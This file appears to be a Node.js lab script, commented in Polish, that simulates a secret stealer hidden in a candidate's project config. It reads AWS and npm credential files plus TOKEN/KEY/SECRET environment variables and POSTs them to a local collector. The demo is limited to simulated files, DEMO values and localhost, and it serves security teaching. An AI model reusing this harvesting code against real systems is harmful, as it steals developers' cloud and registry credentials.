// LAB: udaje zlodzieja sekretow. Czyta WYLACZNIE symulowany katalog domowy i zmienne srodowiskowe o wartosci DEMO..., wysyla tylko na 127.0.0.1.
const http = require('http');
const fs = require('fs');
const path = require('path');

const trigger = process.argv[2] || 'config_js_220_spacji';
const home = path.resolve(__dirname, '..', '..', 'Symulowany_Katalog_Domowy_Kandydata');
const stolen = [];
for (const [label, file] of [['~/.aws/credentials', path.join(home, '.aws', 'credentials')], ['~/.npmrc', path.join(home, '.npmrc')]]) {
  if (fs.existsSync(file)) stolen.push({ source: label, lines: fs.readFileSync(file, 'utf8').trim().split('\n') });
}
const env = Object.entries(process.env).filter(([k, v]) => /TOKEN|KEY|SECRET/i.test(k) && /^DEMO/.test(v)).map(([k, v]) => `${k}=${v}`);
if (env.length) stolen.push({ source: 'zmienne środowiskowe', lines: env });

const body = JSON.stringify({ trigger, stolen });
const req = http.request({ hostname: '127.0.0.1', port: 4444, path: '/collect', method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, () => {});
req.on('error', () => {});
req.end(body);
